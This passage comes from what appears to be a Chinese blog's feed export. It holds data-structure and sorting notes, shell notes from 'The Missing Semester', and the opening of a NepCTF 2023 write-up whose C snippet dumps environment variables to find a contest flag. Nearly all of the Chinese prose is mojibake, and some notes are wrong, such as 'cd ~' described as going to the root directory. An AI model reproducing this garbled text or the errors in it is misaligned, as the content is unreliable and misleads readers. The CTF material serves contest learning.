¹ç»“ç‚¹å’Œå¶ç»“ç‚¹éƒ½æ˜¯é»‘è‰²çš„ï¼‰</span><br><span class="line">ä¸çº¢çº¢ï¼ˆä¸¤ä¸ªç›¸é‚»çš„çº¢ç»“ç‚¹ä¹‹é—´å¿…æœ‰ä¸€ä¸ªé»‘ç»“ç‚¹ï¼‰</span><br><span class="line">é»‘è·¯é€šï¼ˆä»»æ„ç»“ç‚¹åˆ°è¾¾å¶å­ç»“ç‚¹ç»å†çš„é»‘è‰²ç»“ç‚¹æ•°ç›¸åŒï¼‰</span><br></pre></td></tr></table></figure><h4 id="Bæ•°"><a href="#Bæ•°" class="headerlink" title="Bæ•°"></a>Bæ•°</h4><p><strong>å®šä¹‰</strong><br>å¤šè·¯å¹³è¡¡æŸ¥æ‰¾æ ‘<br>Bæ ‘çš„é˜¶ï¼šBæ ‘ä¸­æ‰€æœ‰ç»“ç‚¹çš„å­©å­ä¸ªæ•°çš„æœ€å¤§å€¼ï¼ˆmï¼‰<br>ç©ºæ ‘ï¼šmé˜¶Bæ ‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108213540726.png" alt="image-20240108213540726"></p><p>å¶å­ç»“ç‚¹å®é™…æ˜¯ç©ºæŒ‡é’ˆï¼ˆæŒ‡å‘NULLï¼‰æŸ¥æ‰¾å¤±è´¥ä¹‹åæŒ‡å‘ç©ºå€¼<br>ç»ˆç«¯ç»“ç‚¹æŒ‡å‘å®é™…å€¼<br><strong>ç‰¹æ€§</strong><br>1.æ ‘çš„æ ¹ç»“ç‚¹è‡³å¤šæœ‰mé¢—å­æ ‘ï¼Œå³è‡³å¤šå«æœ‰m-1ä¸ªå…³é”®å­—<br>2.è‹¥æ ¹èŠ‚ç‚¹ä¸æ˜¯ç»ˆç«¯èŠ‚ç‚¹ï¼Œåˆ™è‡³å°‘æœ‰ä¸¤é¢—å­æ ‘<br>3.é™¤æ ¹èŠ‚ç‚¹å¤–çš„æ‰€æœ‰éå¶èŠ‚ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108215954396.png" alt="image-20240108215954396"></p><p>ä»å·¦åˆ°å³ä»¥æ­¤å¢å¤§</p><h4 id="æ•£åˆ—è¡¨å¤„ç†å†²çªçš„æ–¹æ³•"><a href="#æ•£åˆ—è¡¨å¤„ç†å†²çªçš„æ–¹æ³•" class="headerlink" title="æ•£åˆ—è¡¨å¤„ç†å†²çªçš„æ–¹æ³•"></a>æ•£åˆ—è¡¨å¤„ç†å†²çªçš„æ–¹æ³•</h4><h5 id="çº¿æ€§æ¢æµ‹æ³•"><a href="#çº¿æ€§æ¢æµ‹æ³•" class="headerlink" title="çº¿æ€§æ¢æµ‹æ³•"></a>çº¿æ€§æ¢æµ‹æ³•</h5><p>ç”¨æ•£åˆ—å‡½æ•°è¿›è¡Œæ±‚è§£ æœ‰å†²çªå¾€ä¸‹æ±‚è§£</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108220959786.png" alt="image-20240108220959786"></p><h5 id="å¹³æ–¹æ¢æµ‹æ³•"><a href="#å¹³æ–¹æ¢æµ‹æ³•" class="headerlink" title="å¹³æ–¹æ¢æµ‹æ³•"></a>å¹³æ–¹æ¢æµ‹æ³•</h5><p>é¦–å…ˆç”¨æ•£åˆ—å‡½æ•°è¿›è¡ŒæŸ¥æ‰¾ æœ‰å†²çªç”¨diä»0çš„å¹³æ–¹å¼€å§‹<br>é¡ºå»¶å¯ä»¥å¾€å‰ä¹Ÿå¯ä»¥å¾€å<br><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108231526514.png" alt="image-20240108231526514"></p><h5 id="åŒæ•£åˆ—æ³•"><a href="#åŒæ•£åˆ—æ³•" class="headerlink" title="åŒæ•£åˆ—æ³•"></a>åŒæ•£åˆ—æ³•</h5><p>æœ‰å†²çªå¯¹ä¸¤ä¸ªæ•£åˆ—è¡¨é•¿åº¦è¿›è¡Œç›¸åŠ æ±‚è§£å–mod</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108231726833.png" alt="image-20240108231726833"></p><p>i &#x3D; å†²çªçš„æ¬¡æ•°ï¼ˆé€’å¢ï¼‰</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108232107297.png" alt="image-20240108232107297"></p><p>4çš„ä½ç½®å·²è¢«å  æ­¤æ—¶ç”¨Hiå…¬å¼ 0+1*4 &#x3D; 4åˆå›åˆ°4çš„ä½ç½®è¢«å ç”¨ é€’å¢i<br>i &#x3D; 2 Hi &#x3D; 0 + 4 * 2 &#x3D; 8</p><h4 id="ç›´æ¥æ’å…¥æ’åºç®—æ³•"><a href="#ç›´æ¥æ’å…¥æ’åºç®—æ³•" class="headerlink" title="ç›´æ¥æ’å…¥æ’åºç®—æ³•"></a>ç›´æ¥æ’å…¥æ’åºç®—æ³•</h4><p><strong>Step</strong><br>1.é€‰å–ä¸€ä¸ªæ•°å¹¶å°†å…¶ä½œä¸ºæœ‰åºåºåˆ—<br>2.æ¯ä¸€è½®æ’åºå°†åé¢çš„ä¸€ä¸ªæ•°åŠ å…¥æ”¹åºåˆ—<br>3.ç›´åˆ°æœ€åä¸€ä¸ªæ•°</p><h4 id="æŠ˜åŠæ’å…¥æ’åº"><a href="#æŠ˜åŠæ’å…¥æ’åº" class="headerlink" title="æŠ˜åŠæ’å…¥æ’åº"></a>æŠ˜åŠæ’å…¥æ’åº</h4><p><strong>Step</strong><br>1.é€‰å–ä¸€ä¸ªæ•°å¹¶å°†å…¶ä½œä¸ºæœ‰åºåºåˆ—<br>2.æ¯ä¸€è½®ç”¨æŠ˜åŠæŸ¥æ‰¾æ³•å°†åé¢çš„ä¸€ä¸ªæ•°åŠ å…¥åˆ°è¯¥åºåˆ—<br>3.ç›´åˆ°æœ€åä¸€ä¸ªæ•°</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108233354754.png" alt="image-20240108233354754"></p><p>åˆå§‹ä½ç©ºä½™ç”¨æ¥æ’åº é»˜è®¤ç¬¬ä¸€ä½æ˜¯æœ‰åºåºåˆ— ä»ç¬¬äºŒä½å¼€å§‹ å°†ç¬¬äºŒä½ç§»åˆ°0ä½</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108233419168.png" alt="image-20240108233419168"></p><p>é€‰å–æ•°å°äºmid highæŒ‡é’ˆå‰ç§»ï¼ˆmidå‘ä¸Šå–æ•´ï¼‰<br>é€‰å–æ•°å¤§äºmid lowæŒ‡é’ˆåç§»<br>low &#x3D;&#x3D;high æ—¶ç»“æŸæ’åº</p><h4 id="å¸Œå°”æ’åº"><a href="#å¸Œå°”æ’åº" class="headerlink" title="å¸Œå°”æ’åº"></a>å¸Œå°”æ’åº</h4><p>1.é—´éš”åˆ†ç»„ï¼ˆé€šå¸¸ä¸ºæ€»é•¿åº¦çš„ä¸€åŠï¼‰<br>2.ç»„å†…æ’åº<br>3.é‡æ–°è®¾ç½®é—´éš”åˆ†ç»„ï¼ˆä¸ºå‰ä¸€æ¬¡åˆ†ç»„çš„ä¸€åŠï¼‰<br>4.é‡æ–°æ’å…¥æ’åº</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109001556346.png" alt="image-20240109001556346"></p><p>ç»„å†…æ’åº</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109001659213.png" alt="image-20240109001659213"></p><p>åŒæ ·ç»„å†…æ’åºç›´è‡³åˆ†ä¸ºä¸€ç»„</p><h4 id="å†’æ³¡æ’åº"><a href="#å†’æ³¡æ’åº" class="headerlink" title="å†’æ³¡æ’åº"></a>å†’æ³¡æ’åº</h4><p><strong>step</strong><br>1.ä¾æ¬¡æ¯”è¾ƒä¸¤ä¸ªç›¸é‚»å…ƒç´ <br>2.è‹¥æ— åºå°±äº¤æ¢ä½ç½®ï¼Œå°†è¾ƒå¤§å€¼æ”¾åœ¨åé¢</p><h4 id="å¿«é€Ÿæ’åº"><a href="#å¿«é€Ÿæ’åº" class="headerlink" title="å¿«é€Ÿæ’åº"></a>å¿«é€Ÿæ’åº</h4><p><strong>Step</strong><br>1.é€‰å®šä¸€ä¸ªæ•°ä¸ºä¸­å¿ƒè½´ï¼ˆé€šå¸¸ä¸ºé¦–ä½ï¼‰<br>2.å°†å°äºè¯¥æ•°å­—çš„å…ƒç´ æ”¾åœ¨å·¦è¾¹<br>3.å°†å¤§äºè¯¥æ•°å­—çš„å…ƒç´ æ”¾åœ¨å³è¾¹<br>4åˆ†åˆ«ä¸ºå·¦å³å­åºåˆ—é‡å¤å‰ä¸‰æ­¥æ“ä½œ</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109002822376.png" alt="image-20240109002822376"></p><p>é€‰ä¸­è½´ç§»åˆ°æœ€å¼€å§‹ä½ç½®ï¼ˆ0ï¼‰<br>ä»å³è¾¹å¼€å§‹æ’åºï¼ˆhighï¼‰æ‰¾åˆ°æ¯”ä¸­å¿ƒè½´çš„å€¼å°å¼€å§‹ä»å·¦æ¯”è¾ƒ<br>lowå’Œhighé‡åˆæ’åºç»“æŸ</p><h4 id="ç®€å•é€‰æ‹©æ’åº"><a href="#ç®€å•é€‰æ‹©æ’åº" class="headerlink" title="ç®€å•é€‰æ‹©æ’åº"></a>ç®€å•é€‰æ‹©æ’åº</h4><p>Step<br>1.ä»å¤´åˆ°å°¾æ‰«æåºåˆ—ï¼Œæ‰¾åˆ°æœ€å°å…ƒç´ ä¸ç¬¬ä¸€ä½è¿›è¡Œäº¤æ¢<br>2.ä»å‰©ä¸‹çš„æ— åºé˜Ÿåˆ—ä¸­é€‰å‡ºæœ€å°å…ƒç´ ä¸ç¬¬ä¸€ä½è¿›è¡Œäº¤æ¢ï¼Œä»¥æ­¤ç±»æ¨<br><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109003743729.png" alt="image-20240109003743729"></p><p>æ•´ä¸ªæ•°ç»„æœ‰8ä½ç»è¿‡8æ¬¡äº¤æ¢</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109003813759.png" alt="image-20240109003813759"></p><h4 id="å †æ’åºï¼ˆé€‰æ‹©æ’åºï¼‰"><a href="#å †æ’åºï¼ˆé€‰æ‹©æ’åºï¼‰" class="headerlink" title="å †æ’åºï¼ˆé€‰æ‹©æ’åºï¼‰"></a>å †æ’åºï¼ˆé€‰æ‹©æ’åºï¼‰</h4><p><strong>Step</strong><br>1.ç”Ÿæˆå®Œå…¨äºŒå‰æ ‘<br>2.ä»ç¬¬ä¸€ä¸ªéå¶å­ç»“ç‚¹ï¼šn&#x2F;2-1 å¼€å§‹è°ƒæ•´ï¼ˆnï¼šåºåˆ—é•¿åº¦ ï¼‰<br>ä¸€å…±4å±‚é•¿åº¦ä¸º8 8&#x2F;2-1 &#x3D; 3 97å¼€å§‹ </p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109004918159.png" alt="image-20240109004918159"></p><p>å¤§æ ¹å †ï¼šçˆ¶èŠ‚ç‚¹å¤§äºå­ç»“ç‚¹<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109105338676.png" alt="image-20240109105338676"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109105414965.png" alt="image-20240109105414965"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109105435445.png" alt="image-20240109105435445"></p><p>æ’å…¥å…ƒç´ åè¿›è¡Œè°ƒæ•´åªéœ€å¯¹æ ¹èŠ‚ç‚¹åˆ°æ–°å¢èŠ‚ç‚¹è¿›è¡Œè°ƒæ•´</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110347845.png" alt="image-20240109110347845"><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110420903.png" alt="image-20240109110420903">åˆ é™¤å…ƒç´ ååªéœ€å°†å°¾èŠ‚ç‚¹ç§»åŠ¨åˆ°é¦–èŠ‚ç»“ç‚¹çš„ä½ç½®<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110307330.png" alt="image-20240109110307330"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110331687.png" alt="image-20240109110331687"></p><h4 id="å½’å¹¶æ’åº"><a href="#å½’å¹¶æ’åº" class="headerlink" title="å½’å¹¶æ’åº"></a>å½’å¹¶æ’åº</h4><p><strong>Step</strong><br>1.å¼€å§‹æ¯ä¸ªæ•°å­—ä½œä¸ºä¸€ç»„<br>2.æ¯æ¬¡è¿›è¡Œå‰åä¸¤ä¸ªæ•°çš„ä¸¤ä¸¤æ¯”è¾ƒ ç›´åˆ°æœ€åä¸€ç»„<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110533528.png" alt="image-20240109110533528"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110611575.png" alt="image-20240109110611575"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110624186.png" alt="image-20240109110624186"></p><h4 id="åŸºæ•°æ’åº"><a href="#åŸºæ•°æ’åº" class="headerlink" title="åŸºæ•°æ’åº"></a>åŸºæ•°æ’åº</h4><p><strong>step</strong><br>1.å°†æ•°å­—æŒ‰ä½åˆ†å‰²æˆå¤šä¸ªéƒ¨åˆ†<br>2.æ ¹æ®æ¯ä¸ªéƒ¨åˆ†ä¿¡æ¯å°†æ•°å­—è¿›è¡Œåˆ†é…<br>3.å°†æ•°å­—ä¾æ¬¡æ”¶é›† ç»„æˆæ–°çš„æ’åºç»“æœ</p><p>ä¸ªä½<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110744955.png" alt="image-20240109110744955"></p><p>åä½<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110837347.png" alt="image-20240109110837347"></p><p>ç™¾ä½<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110858727.png" alt="image-20240109110858727"></p><h4 id="æ’åºç®—æ³•æ€»ç»“"><a href="#æ’åºç®—æ³•æ€»ç»“" class="headerlink" title="æ’åºç®—æ³•æ€»ç»“"></a>æ’åºç®—æ³•æ€»ç»“</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109111241802.png" alt="image-20240109111241802"></p><p>æœ‰ä¸¤åªåŠ¨ç‰©ï¼Œä¸€åªå«æ’å¸½é¾Ÿï¼Œå¦ä¸€åªå«ç»Ÿè®¡é¸¡ï¼Œå®ƒä¸¤åšäº‹æƒ…éƒ½å¾ˆç¨³ï¼Œå…¶ä¸­æ’å¸½é¾Ÿå–œæ¬¢æ’å¸½å­ï¼Œç»Ÿè®¡é¸¡å–œæ¬¢åšç»Ÿè®¡ï¼ˆåŠ å‡ä¹˜é™¤ï¼‰ã€‚<br>ä½†æœ‰ä¸€å¤©ï¼Œæ’å¸½é¾Ÿåœ¨é€‰æ‹©å¸½å­æ—¶å€™ï¼Œæ‰äº†å¸½å­å°±æ…Œï¼ˆæ–¹ n^2ï¼‰äº†ï¼Œè¿˜å¥½è¢«æ©äººï¼ˆnlogï¼‰æ¡åˆ°å¿«é€Ÿå½’è¿˜ç»™å¯¹æ–¹(å †).</p>]]></content>
      
      
      <categories>
          
          <category> ç¢ç‰‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Missing Semester of Your CS Education</title>
      <link href="/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/"/>
      <url>/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/</url>
      
        <content type="html"><![CDATA[<h2 id="The-Missing-Semester-of-Your-CS-Education"><a href="#The-Missing-Semester-of-Your-CS-Education" class="headerlink" title="The Missing Semester of Your CS Education"></a>The Missing Semester of Your CS Education</h2><h3 id="First-Course-Overview-The-Shell"><a href="#First-Course-Overview-The-Shell" class="headerlink" title="First   Course Overview The Shell"></a>First   Course Overview The Shell</h3><h2 id="å‘½ä»¤è¡Œè¯­å¥"><a href="#å‘½ä»¤è¡Œè¯­å¥" class="headerlink" title="å‘½ä»¤è¡Œè¯­å¥"></a>å‘½ä»¤è¡Œè¯­å¥</h2><table><thead><tr><th align="left"></th><th></th></tr></thead><tbody><tr><td align="left">pwd(process[print] working directory)</td><td>è¾“å‡ºå½“å‰ä½ç½®</td></tr><tr><td align="left">cd .</td><td>åˆ°å½“å‰ç›®å½•</td></tr><tr><td align="left">cd ..</td><td>ä¸Šä¸€çº§ç›®å½•</td></tr><tr><td align="left">cd &#x2F;cd ~</td><td>å›åˆ°æ ¹ç›®å½•</td></tr><tr><td align="left">cd -</td><td>å›åˆ°è·³è½¬å‰çš„ç›®å½•ï¼ˆå¯åœ¨ä¸¤ä¸ªç›®å½•ä¹‹é—´åˆ‡æ¢ï¼‰</td></tr><tr><td align="left">ls -l</td><td>åˆ—å‡ºå½“å‰ç›®å½•ä¸‹å­æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯</td></tr><tr><td align="left">ls -a</td><td>åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶åŒ…å«éšè—æ–‡ä»¶</td></tr><tr><td align="left">* ?</td><td>ä»£æ›¿ä¸€ä¸ªå­—ç¬¦ä¸² ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td align="left">mv A B</td><td>é‡å‘½åå¹¶å¯ä»¥ç§»åŠ¨æ–‡ä»¶</td></tr><tr><td align="left">cp A B</td><td>å¤åˆ¶å¹¶å¯ä»¥ç§»åŠ¨æ–‡ä»¶</td></tr><tr><td align="left">control L</td><td>æ¸…é™¤ç»ˆç«¯</td></tr><tr><td align="left">cat</td><td>æ‰“å°æ–‡ä»¶å†…å®¹åˆ°ç»ˆç«¯ä¸Š</td></tr><tr><td align="left">touch</td><td>å»ºç«‹æ–°æ–‡ä»¶</td></tr><tr><td align="left">&gt;&gt;</td><td>ä¸è¦†ç›–è€Œæ˜¯å åŠ </td></tr><tr><td align="left">A | B</td><td>Açš„è¾“å‡ºä½œä¸ºBçš„è¾“å…¥</td></tr><tr><td align="left">grep A B</td><td>åœ¨Aé‡ŒæŸ¥æ‰¾B</td></tr><tr><td align="left">man,rm,mkdir,rmdir</td><td></td></tr><tr><td align="left">&gt; &#x2F;</td><td>è¦†ç›–</td></tr></tbody></table><p>rmç”¨äºæ— é€’å½’åˆ é™¤ -r é€’å½’åˆ é™¤  rmdirä»…å…è®¸åˆ é™¤ç©ºç›®å½•</p><p>mkdir åˆ›å»ºç›®å½•</p><h3 id="å…³äºé‡å®šå‘å’Œ-cat"><a href="#å…³äºé‡å®šå‘å’Œ-cat" class="headerlink" title="å…³äºé‡å®šå‘å’Œ cat"></a><strong>å…³äºé‡å®šå‘å’Œ cat</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> hello &gt; hello.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> hello.txt</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt; hello.txt</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt; hello.txt &gt; hello2.txt<span class="comment">#å°†txtå†…å®¹å¤åˆ¶åˆ°2.txtä¸­</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> hello2.txt</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;hello.txt &gt;&gt; hello2.txt</span></span><br><span class="line">hello</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>æœ¬ä»¥ä¸º <code>cat &lt; hello.txt</code> ä¼šæŠ¥é”™ <code>cat: hello: No such file or directory</code>ã€‚çŒœæƒ³æ­£ç¡®å·¥ä½œçš„åŸå› æ˜¯â€œå‚æ•°â€å’Œâ€œè¾“å…¥â€çš„åŒºåˆ«ï¼ˆæœªç»éªŒè¯æˆ–æŸ¥æ‰¾èµ„æ–™ï¼‰ï¼šcat ç¨‹åºå°†è¾“å…¥æ‰“å°åœ¨å±å¹•ä¸Šï¼Œ<code>cat hello.txt</code> ä¸­çš„ <code>hello.txt</code> æ˜¯å‚æ•°ï¼Œå°†è¯¥æ–‡ä»¶çš„å†…å®¹ä½œä¸ºè¾“å…¥ï¼›è€Œ <code>cat &lt; hello.txt</code> æ˜¯è¾“å…¥é‡å®šå‘ï¼Œæ„æ€ä¹Ÿæ˜¯å°†æ–‡ä»¶ä¸­çš„å†…å®¹ä½œä¸ºç¨‹åºçš„è¾“å…¥ï¼Œè€Œä¸æ˜¯å°†æ–‡ä»¶çš„å†…å®¹ä½œä¸ºå‚æ•°ï¼Œå› æ­¤äºŒè€…æ•ˆæœç›¸åŒã€‚</p><h3 id="tee-çš„å°ç”¨å¤„"><a href="#tee-çš„å°ç”¨å¤„" class="headerlink" title="tee çš„å°ç”¨å¤„"></a><strong>tee çš„å°ç”¨å¤„</strong></h3><p>æ¥å—è¾“å…¥å¹¶å°†å…¶å†™å…¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> 500 &gt; brightness(sudo suå) == ehco 500 | sudo <span class="built_in">tee</span> brightness</span> </span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cd /sys/<span class="keyword">class</span>/<span class="symbol">backlight</span>/<span class="symbol">thinkpad_screen</span></span><br><span class="line">$ <span class="symbol">sudo</span> <span class="symbol">echo</span> <span class="symbol">3</span> &gt; <span class="symbol">brightness</span></span><br><span class="line"><span class="symbol">An</span> <span class="symbol">error</span> <span class="symbol">occurred</span> <span class="symbol">while</span> <span class="symbol">redirecting</span> <span class="symbol">file</span> &#x27;<span class="symbol">brightness</span>&#x27;</span><br><span class="line"><span class="symbol">open: <span class="symbol">Permission</span></span> <span class="symbol">denied</span></span><br></pre></td></tr></table></figure><p>å‡ºä¹æ„æ–™çš„æ˜¯ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—åˆ°äº†ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ã€‚æ¯•ç«Ÿï¼Œæˆ‘ä»¬å·²ç»ä½¿ç”¨äº† <code>sudo</code> å‘½ä»¤ï¼å…³äº shellï¼Œæœ‰ä»¶äº‹æˆ‘ä»¬å¿…é¡»è¦çŸ¥é“ã€‚<code>|</code>ã€<code>&gt;</code>ã€å’Œ <code>&lt;</code> æ˜¯é€šè¿‡ shell æ‰§è¡Œçš„ï¼Œè€Œä¸æ˜¯è¢«å„ä¸ªç¨‹åºå•ç‹¬æ‰§è¡Œã€‚ <code>echo</code> ç­‰ç¨‹åºå¹¶ä¸çŸ¥é“ <code>|</code> çš„å­˜åœ¨ï¼Œå®ƒä»¬åªçŸ¥é“ä»è‡ªå·±çš„è¾“å…¥è¾“å‡ºæµä¸­è¿›è¡Œè¯»å†™ã€‚ å¯¹äºä¸Šé¢è¿™ç§æƒ…å†µï¼Œ <em>shell</em> (æƒé™ä¸ºæ‚¨çš„å½“å‰ç”¨æˆ·) åœ¨è®¾ç½® <code>sudo echo</code> å‰å°è¯•æ‰“å¼€ brightness æ–‡ä»¶å¹¶å†™å…¥ï¼Œä½†æ˜¯ç³»ç»Ÿæ‹’ç»äº† shell çš„æ“ä½œå› ä¸ºæ­¤æ—¶ shell ä¸æ˜¯æ ¹ç”¨æˆ·ã€‚</p><p>æ˜ç™½è¿™ä¸€ç‚¹åï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ“ä½œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> 3 | sudo <span class="built_in">tee</span> brightness</span> </span><br></pre></td></tr></table></figure><p>å› ä¸ºæ‰“å¼€ <code>/sys</code> æ–‡ä»¶çš„æ˜¯ <code>tee</code> è¿™ä¸ªç¨‹åºï¼Œå¹¶ä¸”è¯¥ç¨‹åºä»¥ <code>root</code> æƒé™åœ¨è¿è¡Œï¼Œå› æ­¤æ“ä½œå¯ä»¥è¿›è¡Œã€‚</p><p>å½“æœ‰æƒé™ä¿®æ”¹æ–‡ä»¶ä½†æ— æ³•ä¿®æ”¹æ–‡ä»¶æ‰€åœ¨ç›®å½•æ—¶ï¼Œå³æ— æ³•åˆ é™¤æ–‡ä»¶ï¼Œåªå¯å°†å…¶åˆ¶ç©º</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xdg-<span class="keyword">open</span> binary <span class="type">name</span>#é€‚ç”¨Linux just <span class="keyword">open</span> <span class="keyword">on</span> the Mac <span class="keyword">system</span> Windows didn<span class="string">&#x27;t work</span></span><br></pre></td></tr></table></figure><h3 id="Shell-Tools-and-Scripting"><a href="#Shell-Tools-and-Scripting" class="headerlink" title="Shell Tools and Scripting"></a>Shell Tools and Scripting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/m/tools &gt; &gt; &gt;<span class="built_in">echo</span> <span class="string">&quot;value is <span class="variable">$foo</span>&quot;</span></span><br><span class="line">value is bash</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~<span class="regexp">/m/</span>tools &gt; &gt; &gt;echo <span class="string">&#x27;value is $foo&#x27;</span></span><br><span class="line">vlaue is <span class="symbol">$foo</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç¢ç‰‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nepæ‘¸é±¼è®°</title>
      <link href="/2023/11/27/NepCTF%202023/"/>
      <url>/2023/11/27/NepCTF%202023/</url>
      
        <content type="html"><![CDATA[<h2 id="NepCTF-2023"><a href="#NepCTF-2023" class="headerlink" title="NepCTF 2023"></a>NepCTF 2023</h2><p>ä¸ºä»€ä¹ˆå¼€èµ›ä¸¤åˆ†é’Ÿé€‰æ‹©ä¸æ‰“äº†ï¼Ÿ<br>ç­”æ¡ˆå¾ˆç®€å•ï¼š<del>ç­¾åˆ°é¢˜æ ¼å¼æ‰“é”™äº†â€¦è¿è¥å§å§æ²¡å›æˆ‘â€¦48hâ€¦</del><br>ç‚®ç°pwnä¸ä¼šåšï¼ï¼ï¼ï¼ˆå…¶å®å¯ä»¥åšmiscï¼‰</p><h3 id="Msic"><a href="#Msic" class="headerlink" title="Msic"></a>Msic</h3><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>é¢˜ç›®æç¤ºflagåœ¨ç¯å¢ƒå˜é‡ä¸­ <del>å¼€å§‹STFW</del><br><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">https://blog.csdn.net/aspnet_lyc/article/details/20548767</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** arge)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(*arge)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *arge++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814162812545.png" alt="image-20230814162812545"></p><h4 id="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"><a href="#ä¸AIå…±èˆçš„å“ˆå¤«æ›¼" class="headerlink" title="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"></a>ä¸AIå…±èˆçš„å“ˆå¤«æ›¼</h4><p>æ±‚åŠ©chatå› ä¸ºä¸ä¼šç”¨<del>copilot</del></p><h4 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h4><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814174205317.png" alt="image-20230814174205317"></p><p>äº”å­æ£‹ ä¸ä¼šå†™è„šæœ¬å¹²ä¸‹å§hhï¼ˆæ±‚åŠ©chatä¹Ÿä¸æ˜¯ä¸è¡Œï¼‰</p><figure class="highlight 